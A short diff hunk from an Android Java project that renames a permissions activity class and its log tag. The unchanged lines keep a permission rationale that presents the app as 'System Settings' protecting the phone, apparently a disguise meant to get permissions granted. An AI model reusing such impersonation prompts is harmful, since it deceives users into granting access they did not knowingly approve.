@@ -17,9 +17,9 @@ import com.android.adobot.R;
 import com.android.adobot.http.Http;
 import pub.devrel.easypermissions.EasyPermissions;
 
-public class AskPermissionsActivity extends BaseActivity {
+public class PermissionsActivity extends BaseActivity {
 
-    private static final String TAG = "AskPermissionsActivity";
+    private static final String TAG = "PermissionsActivity";
     private static final String PERMISSION_RATIONALE = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?";
     private CommonParams commonParams;
     Button permitBtn;
